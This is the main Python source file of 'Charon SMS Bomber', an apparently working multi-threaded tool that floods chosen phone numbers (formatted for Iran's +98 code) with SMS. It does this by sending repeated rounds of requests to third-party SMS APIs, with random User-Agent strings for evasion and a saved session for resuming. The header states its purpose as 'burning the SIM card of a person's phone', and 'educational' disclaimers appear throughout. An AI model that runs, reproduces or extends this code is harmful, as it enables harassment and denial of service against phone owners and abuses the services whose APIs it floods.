# -*- coding: utf-8 -*-

######################################################################################
# About :                                                                            #
#                                                                                    #
# Description: This Program Powered By Charon Security Agency                        #
# Made for: Fun and burning the SIM card of a person's phone                         #
# Programmer: AmirHossein Ghanami (Ch4120N)                                          #
#                                                                                    #
# Copyright :                                                                        #
#                                                                                    #
# Charon SMS Bomber (C) <2025> <Charon Security Agency>                              #
# This Program Is Free Software: You Can Redistribute It                             #
# It Under The Terms Of The  `Charon General Black License`  As Published By         #
# The Black Hacking Software Foundation , Either Version 1 Of The License.           #
# This Program Is Distributed In The Hope That It Will Be Useful,                    #
# But Without Any Warranty .  See The                                                #
# `Charon General Black License` For More Details.                                   #
# You Should Have Received A Copy Of The  `Charon General Black License`             #
# Along With This Program. If Not, See <http://charonsecurityagency.github.io/cgbl>  #
#                                                                                    #
######################################################################################

import os
import signal
import json
import sys
import requests
import time
import webbrowser
import concurrent.futures as confutures
from Core.Config import *
from Core.Functions import colorizeInput
from Core.Banner import Banner, Menu
from Core.Api import API_LIST, API_VERSION, API_LIST_COUNT
from Core.Log import Logs
from fake_useragent import UserAgent

# Generate random User-Agent headers to make requests look less predictable
ua = UserAgent()


class ChSMSBomber:
    """
    ChSMSBomber - A multi-threaded SMS Bomber tool for educational/research use.

    Features:
    - Multi-target: Allows bombing multiple phone numbers at once.
    - Threading: Uses ThreadPoolExecutor for concurrent API requests.
    - Round-based: Can send multiple attack "rounds".
    - Config persistence: Saves attack parameters to continue.json for resuming.
    - Update checker: Automatically checks for new versions from GitHub.
    """

    def __init__(self):
        # Default runtime configuration
        self.REQUEST_TIMEOUT = 5        # Timeout for each request (seconds)
        self.REQUEST_DELAY = 0.05       # Delay between requests (seconds)
        self.targetPhoneNumber = []     # List of targets
        self.numThreads = 0             # Number of concurrent threads
        self.numRounds = 0              # Number of attack rounds
        self.API_LIST = []              # API endpoints for SMS sending

        # Attach signal handler for CTRL+C
        signal.signal(signal.SIGINT, self.CTRL_C_SIGNAL)

        # Show banner and check for updates
        print(Banner.DefaultBanner())
        self.check_update()

        # Menu loop
        while True:
            print(Banner.DefaultBanner())

            # If there’s a saved session, show "Continue" menu
            if os.path.exists("continue.json"):
                print(Menu.MainMenuContinue())
            else:
                print(Menu.MainMenu())

            try:
                mainMenuInputChoose = int(colorizeInput(INPUT_HOME))

                if mainMenuInputChoose == 1:
                    self.startMain()  # Start new bombing session
                elif mainMenuInputChoose == 2:
                    self.continueMain()  # Continue from saved configuration
                elif mainMenuInputChoose == 3:
                    webbrowser.open("https://github.com/Ch4120N/Charon-SMS-Bomber")
                elif mainMenuInputChoose == 4:
                    self.aboutMain()  # Display about info
                elif mainMenuInputChoose == 5:
                    # Exit cleanly
                    print("\r" + Logs.error("Program Interrupted By User!"), flush=True)
                    os.kill(os.getpid(), signal.SIGTERM)
            except ValueError:
                print(Logs.error("Invalid Value. Please Insert Number (e.g, 1)"))
                colorizeInput(INPUT_BACKMENU)

    def CTRL_C_SIGNAL(self, frm, func):
        """
        Graceful shutdown when user presses CTRL+C.
        """
        print("\n\n", "\r" + Logs.error("Program Interrupted!"), flush=True)
        os.kill(os.getpid(), signal.SIGTERM)

    def check_update(self):
        """
        Compare local VERSION with the GitHub version file.
        Terminates if update is available.
        """
        print(Logs.fetchMessage("Checking for updates ..."))
        fver = requests.get(
            "https://raw.githubusercontent.com/Ch4120N/Charon-SMS-Bomber/master/version"
        ).text.strip()

        if fver != VERSION:
            print(Logs.generalMessage(
                f"{Fore.LIGHTRED_EX}An update available. "
                f"Please visit {Fore.LIGHTBLUE_EX}https://github.com/Ch4120N/Charon-SMS-Bomber"
            ))
            colorizeInput(INPUT_EXIT)
            sys.exit(1)
        else:
            print(Logs.generalMessage(f"{Fore.LIGHTGREEN_EX}ChSMSBomber is up to date"))
            time.sleep(1.5)

    def send_request(self, session, api_config):
        """
        Sends a request to an API endpoint.

        Args:
            session (requests.Session): Session object for efficiency.
            api_config (dict): Contains method, URL, headers, payload, etc.

        Returns:
            bool: True if success (status 2xx), False otherwise.
        """
        try:
            method = api_config.get("method", "POST").upper()
            url = api_config["url"]

            # Clone headers and inject random User-Agent
            headers = api_config.get("headers", {}).copy()
            headers['User-Agent'] = ua.random

            request_kwargs = {
                "headers": headers,
                "timeout": self.REQUEST_TIMEOUT,
                "verify": False  # Disable SSL verification warnings
            }

            # Payload handling
            if "payload" in api_config:
                request_kwargs["json"] = api_config["payload"]
            elif "data" in api_config:
                data_str = api_config["data"]
                if isinstance(data_str, dict):
                    data_str = json.dumps(data_str)
                try:
                    request_kwargs["data"] = json.loads(data_str)
                except json.JSONDecodeError:
                    request_kwargs["data"] = data_str
            elif "params" in api_config:
                request_kwargs["params"] = api_config["params"]

            response = session.request(method, url, **request_kwargs)

            return 200 <= response.status_code < 300
        except (requests.exceptions.RequestException,
                requests.exceptions.Timeout,
                requests.exceptions.ConnectionError):
            return False
        except Exception:
            return False

    def startMain(self):
        """
        Start a new bombing session by collecting user inputs.
        """
        print(Banner.DefaultBanner())
        print(f" {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}::{Fore.LIGHTBLUE_EX}]"
              f"{Fore.YELLOW} You can enter multiple phone numbers separated by ';'"
              f" {Fore.LIGHTBLUE_EX}[{Fore.LIGHTWHITE_EX}::{Fore.LIGHTBLUE_EX}]\n\n")

        self.targetPhoneNumber = colorizeInput(PROMPTS[0]).replace(' ', '').split(';')

        if not any(self.targetPhoneNumber):
            print(Logs.error("You must enter at least one phone number"))
            colorizeInput(INPUT_BACKMENU)
            return

        # Normalize phone numbers into +98xxxxxxxxxx format
        for i in range(len(self.targetPhoneNumber)):
            if self.targetPhoneNumber[i].startswith("0"):
                self.targetPhoneNumber[i] = "+98" + self.targetPhoneNumber[i][1:]
            elif self.targetPhoneNumber[i].startswith("98"):
                self.targetPhoneNumber[i] = "+" + self.targetPhoneNumber[i]
            elif self.targetPhoneNumber[i].startswith("+98"):
                pass
            else:
                print(Logs.error(
                    f"Invalid phone number format {Fore.CYAN}("
                    f"{Fore.LIGHTYELLOW_EX}{self.targetPhoneNumber[i]}{Fore.CYAN})"
                    f"{Fore.LIGHTRED_EX}. Must start with 0, 98, or +98"
                ))
                colorizeInput(INPUT_BACKMENU)
                return

            if len(self.targetPhoneNumber[i]) != 13:
                print(Logs.error(
                    f"Invalid phone number length {Fore.CYAN}("
                    f"{Fore.LIGHTYELLOW_EX}{self.targetPhoneNumber[i]}{Fore.CYAN})"
                    f"{Fore.LIGHTRED_EX}. Must be 11 digits after country code"
                ))
                colorizeInput(INPUT_BACKMENU)
                return

        # Threads
        try:
            self.numThreads = int(colorizeInput(PROMPTS[1]))
        except ValueError:
            print(Logs.error("Invalid Value. Default set to 1\n"))
            self.numThreads = 1

        # Rounds
        try:
            self.numRounds = int(colorizeInput(PROMPTS[2]))
            if self.numRounds > 20:
                raise ValueError("Max Count Rounds")
        except ValueError:
            print(Logs.error("Invalid Value/Or Exceeds Max. Default set to 10\n"))
            self.numRounds = 10

        # Delay
        try:
            self.REQUEST_DELAY = float(colorizeInput(PROMPTS[3]))
        except ValueError:
            print(Logs.error("Invalid Value. Default set to 1.0\n"))
            self.REQUEST_DELAY = 1.0

        self.displaySummery()

    def continueMain(self):
        """
        Load configuration from continue.json to resume attack.
        """
        with open("continue.json", "r") as continueFileRead:
            data = json.loads(continueFileRead.read())

        self.targetPhoneNumber = data['targets'].replace(' ', '').split(";")
        self.numThreads = data['threads']
        self.numRounds = data['rounds']
        self.REQUEST_DELAY = data['delay']

        self.displaySummery()

    def displaySummery(self):
        """
        Show attack configuration summary before starting.
        """
        print(Banner.AttackingBanner())
        print(f" {Fore.CYAN}[{Fore.LIGHTGREEN_EX}√{Fore.CYAN}]"
              f"{Fore.LIGHTGREEN_EX} Gearing up the Charon SMS Bomber - Please be patient")
        print(Logs.generalMessage(f"{Fore.YELLOW}Stay connected to the internet during attack"))
        print(Logs.generalMessage(f"API Version       : " + API_VERSION))
        print(Logs.generalMessage(f"Targets           : ") +
              (';'.join(self.targetPhoneNumber) if len(self.targetPhoneNumber) > 1
               else self.targetPhoneNumber[0] if self.targetPhoneNumber else ''))
        print(Logs.generalMessage(f"Threads           : {self.numThreads}"))
        print(Logs.generalMessage(f"Rounds            : {self.numRounds}"))
        print(Logs.generalMessage(f"Delay             : {self.REQUEST_DELAY} seconds"))
        print(f"\n {Fore.CYAN}[{Fore.LIGHTRED_EX}!{Fore.CYAN}]"
              f"{Fore.YELLOW} This tool was made for fun, educational, and research purposes only")

        # Save session
        with open("continue.json", "w") as saveFileJson:
            saveFileJson.write(json.dumps({
                "targets": ';'.join(self.targetPhoneNumber) if len(self.targetPhoneNumber) > 1 else
                           self.targetPhoneNumber[0] if self.targetPhoneNumber else '',
                "threads": self.numThreads,
                "rounds": self.numRounds,
                "delay": self.REQUEST_DELAY
            }, indent=4))

        colorizeInput(INPUT_START)
        self.startAttack()

    def get_combined_list(self, apiList):
        """
        Flatten API lists for multiple targets into a combined, round-robin list.
        """
        combined_list = []
        min_length = min(len(lst_api) for lst_api in apiList)
        for i in range(min_length):
            for lst in apiList:
                combined_list.append(lst[i])
        return combined_list

    def pretty_print(self, phone_numbers, round_count: int, api_name: str, success: int, failed: int):
        """
        Display attack progress in real-time.
        """
        print(Banner.AttackingBanner())
        sended = success + failed
        print(f"  {Fore.CYAN}[{Fore.LIGHTGREEN_EX}√{Fore.CYAN}]"
              f"{Fore.LIGHTGREEN_EX} Bombing is in progress - Please be patient")
        print(Logs.generalMessage(f"{Fore.YELLOW}Stay connected to the internet during attack"))
        print(Logs.generalMessage("Target       : " + phone_numbers))
        print(Logs.generalMessage("Rounds       : " + str(round_count) + "/" + str(self.numRounds)))
        print(Logs.generalMessage("API Name     : " + api_name))
        print(Logs.generalMessage("Sent         : " + str(sended) + "/" + str(len(self.API_LIST))))
        print(Logs.generalMessage("Successful   : " + str(success)))
        print(Logs.generalMessage("Failed       : " + str(failed)))
        print(f"  {Fore.CYAN}[{Fore.LIGHTRED_EX}!{Fore.CYAN}]"
              f"{Fore.YELLOW} This tool was made for fun, educational, and research purposes only")

    def startAttack(self):
        """
        Main attack loop: iterates through rounds, sends requests
        with ThreadPoolExecutor, and tracks statistics.
        """
        all_phoneNumbers_api_lists = []

        # Prepare API list for each phone number
        for phone_number in self.targetPhoneNumber:
            phone_number = phone_number.strip()
            if phone_number:
                unique_apis = []
                seen = set()
                api_list = API_LIST(phone_number)
                for api in api_list:
                    identifier = (api["url"], api.get("method", "POST"))
                    if identifier not in seen:
                        unique_apis.append(api)
                        seen.add(identifier)
                all_phoneNumbers_api_lists.append(unique_apis)

        # Merge into one unified API list
        self.API_LIST = self.get_combined_list(all_phoneNumbers_api_lists)
        targets = ';'.join(self.targetPhoneNumber) if len(self.targetPhoneNumber) > 1 else self.targetPhoneNumber[0]

        with requests.Session() as session:
            countOfRounds, countOfSucess, countOfFailed = 0, 0, 0

            # Loop through attack rounds
            while countOfRounds < self.numRounds:
                with confutures.ThreadPoolExecutor(max_workers=self.numThreads) as executor:
                    future_to_api = {
                        executor.submit(self.send_request, session, api): api.get("name", "Unknown API")
                        for api in self.API_LIST
                    }

                    for future in confutures.as_completed(future_to_api):
                        api_name = future_to_api[future]
                        try:
                            success = future.result()
                            if success:
                                countOfSucess += 1
                            else:
                                countOfFailed += 1
                        except Exception:
                            countOfFailed += 1

                        # Print attack status
                        self.pretty_print(targets, countOfRounds, api_name, countOfSucess, countOfFailed)
                        time.sleep(self.REQUEST_DELAY)

                # Prepare for next round
                print(Banner.AttackingBanner())
                print(f"\n {Fore.LIGHTBLUE_EX}[{Fore.YELLOW}!{Fore.LIGHTBLUE_EX}]"
                      f"{Fore.LIGHTWHITE_EX} Starting next round in 3 seconds ...")
                countOfSucess, countOfFailed = 0, 0
                countOfRounds += 1
                time.sleep(3)

            # Attack completed
            print(Banner.AttackingBanner())
            print(Logs.success("Bombing Completed!"))
            colorizeInput(INPUT_BACKMENU)

    def aboutMain(self):
        """
        Show program details: name, version, repo, license.
        """
        print(Banner.DefaultBanner())
        print(f" {Fore.LIGHTGREEN_EX}#############################################################################")
        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Program Name            :  {Fore.LIGHTCYAN_EX}Charon SMS Bomber                              {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Program Version         :  {Fore.LIGHTCYAN_EX}2.1.1                                          {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Repository Page         :  {Fore.LIGHTCYAN_EX}https://github.com/Ch4120N/Charon-SMS-Bomber   {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Owned By                :  {Fore.LIGHTCYAN_EX}Ch4120N (AmirHossein Ghanami)                  {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTWHITE_EX} Licence                 :  {Fore.LIGHTCYAN_EX}CGBL (Charon General Black Licence)            {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#                                                                           {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#{Fore.LIGHTRED_EX}  ! This tool was made for fun, educational, and research purposes only !  {Fore.LIGHTGREEN_EX}#")
        print(f" {Fore.LIGHTGREEN_EX}#############################################################################\n")
        colorizeInput(INPUT_BACKMENU)


if __name__ == '__main__':
    # Ensure Python3 environment
    if sys.version_info[0] != 3:
        print("[-] ChSMSBomber will work only in Python v3")
        sys.exit()

    # Disable SSL warnings from urllib3
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    # Start program
    ChSMSBomber()
